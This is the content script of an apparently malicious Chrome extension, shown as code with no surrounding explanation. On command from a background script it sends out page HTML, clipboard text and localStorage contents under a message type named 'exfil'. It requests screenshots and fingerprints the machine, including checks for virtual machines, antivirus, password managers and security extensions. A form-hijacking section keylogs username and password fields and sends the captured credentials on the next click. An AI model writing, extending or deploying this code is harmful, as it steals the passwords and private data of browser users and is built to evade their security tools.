// content_script.js

// Listen for commands from background
chrome.runtime.onMessage.addListener((msg, sender, reply) => {
  if (msg.command === 'domSnapshot') {
    const snapshot = document.documentElement.outerHTML;
    chrome.runtime.sendMessage({
      type: 'exfil',
      data: {
        action: 'domSnapshot',
        snapshot,
        location: window.location.href
      }
    });
  } else if (msg.command === 'clipboardCapture') {
    (async () => {
      try {
        // Check if we have clipboard permission
        const permissionStatus = await navigator.permissions.query({
          name: 'clipboard-read' 
        });
        
        if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
          // Create a focused element to trigger clipboard read
          const tempInput = document.createElement('input');
          document.body.appendChild(tempInput);
          tempInput.focus();
          
          try {
            const clipText = await navigator.clipboard.readText();
            chrome.runtime.sendMessage({
              type: 'exfil',
              data: {
                action: 'CLIPBOARDCAPTURE',
                clipboardData: clipText,
                location: window.location.href
              }
            });
          } finally {
            tempInput.remove();
          }
        } else {
          throw new Error('Clipboard permission denied');
        }
      } catch (err) {
        chrome.runtime.sendMessage({
          type: 'exfil',
          data: {
            action: 'CLIPBOARDCAPTURE',
            error: 'Please allow clipboard access and try again',
            location: window.location.href
          }
        });
      }
    })();
  } else if (msg.command === 'localStorageDump') {
    const store = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      store[key] = localStorage.getItem(key);
    }
    chrome.runtime.sendMessage({
      type: 'exfil',
      data: {
        action: 'localStorageData',
        storage: store,
        location: window.location.href
      }
    });
  } else if (msg.command === 'screenshot') {
    // Request the background page to capture a screenshot
    chrome.runtime.sendMessage(
      { type: 'capture_screenshot', location: window.location.href },
      function(response) {
        // Acknowledgment can be handled here if needed
      }
    );
  } else if (msg.command === 'enumeration') {
    performEnumeration();
  }
  reply({ status: 'received' });
  return true;
});

function getGPUInfo() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  
  if (!gl) {
    return {
      vendor: 'unknown',
      renderer: 'unknown',
      webglVersion: 'not supported'
    };
  }

  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
    webglVersion: gl.getParameter(gl.VERSION),
    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
    maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
  };
}

function getHardwareInfo() {
  return {
    deviceMemory: navigator.deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
    maxTouchPoints: navigator.maxTouchPoints,
    battery: 'getBattery' in navigator,
    connection: navigator.connection ? {
      type: navigator.connection.type,
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    } : 'unknown'
  };
}

async function getInstalledExtensions() {
  const commonExtensions = [
    // Ad Blockers
    'chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/', // uBlock Origin
    'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/', // AdBlock
    'chrome-extension://bgnkhhnnamicmpeenaelnjfhikgbkllg/', // AdGuard
    
    // Security & Privacy
    'chrome-extension://gcbommkclmclpchllfjekcdonpmejbdp/', // HTTPS Everywhere
    'chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/', // Privacy Badger
    'chrome-extension://fhnegjjodccspfhpgnkhmcgihmgfjfeg/', // Malwarebytes
    'chrome-extension://hlkenndednhfkekhgcdicdfddnkalmdm/', // Cookie Auto-Delete
    
    // Password Managers
    'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/', // LastPass
    'chrome-extension://nngceckbapebfimnlniiiahkandclblb/', // Bitwarden
    'chrome-extension://opemmfoodbadihjjhjoejhknmoopkbpi/', // 1Password
    'chrome-extension://bbcinlkgjjkejfdpemiealijmmookhip/', // Keeper
    
    // Enterprise & MDM
    'chrome-extension://hpbpdcjchkkdcgokpgkfnkchlfkdcpmc/', // Cisco Umbrella
    'chrome-extension://khgocmkkpikpnmmkgmdnfckapcdkgfaf/', // CrowdStrike
    'chrome-extension://eemlkeanncmjljgehlbplemhmdmalhdc/', // Zscaler
    'chrome-extension://kpiecbcckbofpmkkkdibbllpinceiihk/', // Microsoft Defender
    
    // Development Tools
    'chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/', // React DevTools
    'chrome-extension://nhdogjmejiglipccpnnnanhbledajbpd/', // Vue DevTools
    'chrome-extension://bfbameneiokkgbdmiekhjnmfkcnldhhm/', // Web Developer
    
    // Productivity & Enterprise
    'chrome-extension://ghbmnnjooekpmoecnnnilnnbdlolhkhi/', // Google Docs Offline
    'chrome-extension://gbkeegbaiigmenfmjfclcdgdpimamgkj/', // Office Online
    'chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/', // Grammarly
    'chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/'  // Cisco Webex
  ];
  
  const detectedExtensions = [];
  
  for (const ext of commonExtensions) {
    try {
      const response = await fetch(`${ext}manifest.json`);
      if (response.ok) {
        const manifest = await response.json();
        detectedExtensions.push({
          name: manifest.name,
          version: manifest.version,
          description: manifest.description
        });
      }
    } catch (e) {
      // Extension not found or access denied
      continue;
    }
  }
  
  return detectedExtensions;
}

async function performEnumeration() {
  const enumData = {
    browser: {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      vendor: navigator.vendor,
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
    },
    screen: {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      orientation: screen.orientation?.type || 'unknown'
    },
    hardware: getHardwareInfo(),
    gpu: getGPUInfo(),
    security: {
      virtualMachine: checkForVM(),
      antivirusHints: detectAVSoftware()
    },
    capabilities: {
      webGL: hasWebGL(),
      webRTC: hasWebRTC(),
      canvas: hasCanvas(),
      audio: hasAudioSupport()
    },
    extensions: await getInstalledExtensions(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString()
  };

  chrome.runtime.sendMessage({
    type: 'exfil',
    action: 'ENUMERATION',
    data: enumData
  });
}

// Helper functions
function checkForVM() {
  // Basic VM detection
  const hints = [];
  if (navigator.hardwareConcurrency <= 1) hints.push('Single CPU core');
  if (window.screen.width < 1024 || window.screen.height < 768) hints.push('Low resolution');
  return hints.length > 0;
}

function detectAVSoftware() {
  const hints = [];
  // Check for common AV software objects
  if (window.hasOwnProperty('Avast')) hints.push('Avast');
  if (window.hasOwnProperty('AVAST')) hints.push('AVAST');
  if (window.hasOwnProperty('AVG')) hints.push('AVG');
  return hints;
}

function hasWebGL() {
  const canvas = document.createElement('canvas');
  return !!canvas.getContext('webgl') || !!canvas.getContext('experimental-webgl');
}

function hasWebRTC() {
  return navigator.mediaDevices && navigator.mediaDevices.getUserMedia;
}

function hasCanvas() {
  const canvas = document.createElement('canvas');
  return !!(canvas.getContext && canvas.getContext('2d'));
}

function hasAudioSupport() {
  return !!(window.AudioContext || window.webkitAudioContext);
}



// --- Form Submit Hijacking Logic ---

let formCaptureConfig = { enabled: false, domains: [] };
const STORAGE_KEY = 'temp_credentials';

function loadFormCaptureConfig() {
  chrome.storage.local.get('form_capture_config', (result) => {
    if (result.form_capture_config) {
      formCaptureConfig = result.form_capture_config;
      // If the feature is being enabled, clear any stale credentials from storage
      if (formCaptureConfig.enabled) {
        chrome.storage.local.remove(STORAGE_KEY);
      }
    } else {
      formCaptureConfig = { enabled: false, domains: [] }; // Ensure config is reset if not found
    }
  });
}

// Listen for input events to capture credentials in real-time and save to storage
function handleInput(event) {
    if (!formCaptureConfig.enabled) return;

    const target = event.target;
    if (target.tagName === 'INPUT' && (target.type === 'text' || target.type === 'password' || target.type === 'email')) {
        const form = target.closest('form, div, section');
        if (form && form.querySelector('input[type="password"]')) {
            const name = target.name || target.id || target.placeholder || target.type;
            if (name) {
                chrome.storage.local.get(STORAGE_KEY, (data) => {
                    const credentials = data[STORAGE_KEY] || {};
                    credentials[name] = target.value;
                    chrome.storage.local.set({ [STORAGE_KEY]: credentials });
                });
            }
        }
    }
}

// Listen for clicks to detect submission attempt
function handleClick(event) {
    if (!formCaptureConfig.enabled) return;

    // No need to check the form context here, as the input handler already qualified the form.
    // Any relevant click could be the submission trigger, especially in multi-iframe scenarios.
    chrome.storage.local.get(STORAGE_KEY, (data) => {
        const capturedCredentials = data[STORAGE_KEY];
        if (capturedCredentials && Object.keys(capturedCredentials).length > 0) {
            // Exfiltrate data
            chrome.runtime.sendMessage({
                type: 'exfil',
                data: {
                    action: 'form_submit_capture',
                    credentials: capturedCredentials,
                    location: window.location.href
                }
            });

            // Disable feature and clear storage
            formCaptureConfig.enabled = false;
            chrome.storage.local.set({ form_capture_config: formCaptureConfig });
            chrome.storage.local.remove(STORAGE_KEY);
        }
    });
}

// --- Initialization ---
loadFormCaptureConfig();
document.addEventListener('input', handleInput, true);
document.addEventListener('click', handleClick, true);

// Add listener for config updates from background script
chrome.runtime.onMessage.addListener((msg, sender, reply) => {
    if (msg.command === 'update_form_capture_config') {
        loadFormCaptureConfig();
    }
    return true; // Keep message channel open for other listeners
});

